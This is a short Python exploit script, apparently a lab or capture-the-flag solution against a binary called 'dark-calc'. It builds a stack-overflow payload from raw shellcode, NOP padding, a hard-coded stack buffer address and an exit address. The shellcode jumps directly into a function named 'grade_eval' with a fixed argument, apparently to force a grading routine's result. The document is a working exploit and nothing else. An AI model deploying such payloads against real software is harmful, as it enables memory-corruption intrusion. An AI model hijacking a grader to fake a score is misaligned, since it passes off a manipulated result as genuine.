import struct
import sys

def p64(x):
    return struct.pack("<Q", x)

BUF = 0x721000800fd0        # dark-calc 固定栈上 input 的 expression 起始地址
GRADE_EVAL = 0x401a87
EXIT_PLT = 0x401880

# mov edi, 4 ; mov eax, grade_eval ; jmp rax
shellcode = bytes.fromhex("bf04000000") + bytes.fromhex("b8871a4000") + bytes.fromhex("ffe0")

payload = shellcode + b"\x90" * 4 + p64(0) + p64(BUF) + p64(EXIT_PLT)
sys.stdout.buffer.write(payload)
